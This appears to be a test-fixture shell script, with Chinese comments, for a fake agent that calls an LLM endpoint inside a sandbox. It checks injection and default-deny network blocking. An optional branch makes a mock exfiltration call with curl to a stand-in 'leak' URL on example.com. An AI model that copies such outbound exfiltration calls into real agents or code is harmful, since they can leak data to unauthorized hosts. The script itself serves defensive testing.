#!/bin/sh
# 假 agent：模拟"读环境变量 -> 调 LLM 接口 -> 打印结果"的最小闭环。
# 它不依赖任何真实凭据，用于在无网络、无账号的环境里验证注入与阻断。
set -eu

base="${TWINBOX_BASE_URL:-}"
if [ -z "$base" ]; then
  echo "fake-agent: TWINBOX_BASE_URL 未设置" >&2
  exit 2
fi

echo "fake-agent: base=$base"
echo "fake-agent: api_key_len=$(printf %s "${ANTHROPIC_API_KEY:-}" | wc -c | tr -d " ")"

code=$(curl -s -o /tmp/fake-agent.out -w '%{http_code}' \
  -X POST "$base/v1/messages" \
  -H 'content-type: application/json' \
  -d '{"model":"fake","messages":[{"role":"user","content":"ping"}]}' 2>/dev/null || echo 000)

echo "fake-agent: status=$code"
head -c 200 /tmp/fake-agent.out 2>/dev/null || true
echo

# 尝试一次未授权外发，用于验证默认拒绝
if [ "${FAKE_ATTACK:-0}" = "1" ]; then
  echo "fake-agent: 尝试外发到未授权主机"
  curl -s -m 2 -o /dev/null -w 'exfil_status=%{http_code}\n' https://example.com/leak || echo "exfil_blocked"
fi

[ "$code" = "200" ]
